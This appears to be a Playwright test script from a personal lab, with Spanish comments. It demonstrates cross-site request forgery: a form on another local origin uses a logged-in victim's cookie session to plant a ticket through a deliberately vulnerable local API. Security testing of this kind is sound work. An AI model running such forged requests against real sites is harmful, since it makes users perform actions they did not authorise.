// Laboratorio propio: un formulario de otro sitio manda un POST a la API con la sesión de la víctima.
//   node lab/probar-csrf.mjs localhost    (otro sitio)   |   node lab/probar-csrf.mjs 127.0.0.1   (mismo sitio, otro puerto)
import { chromium } from '@playwright/test';
const [, , hostAtacante] = process.argv; // localhost (otro sitio) o 127.0.0.1 (mismo sitio)
const b = await chromium.launch();
const ctx = await b.newContext();
const p = await ctx.newPage();
await p.goto('http://127.0.0.1:3110/lab/vulnerable.html');
await p.click('#entrar-cookie');
await p.waitForFunction(() => document.getElementById('estado').textContent !== 'Sin sesión');
const ataque = await ctx.newPage();
await ataque.goto(`http://${hostAtacante}:3119/csrf.html`);
await ataque.waitForLoadState('load');
console.log('respuesta de la API al formulario del atacante:', (await ataque.textContent('body'))?.slice(0, 140));
const lista = await ctx.request.get('http://127.0.0.1:3110/api/tickets');
const t = (await lista.json()).datos.map((x) => x.titulo);
console.log('hay un ticket plantado:', t.includes('Ticket plantado por otro sitio'));
await b.close();
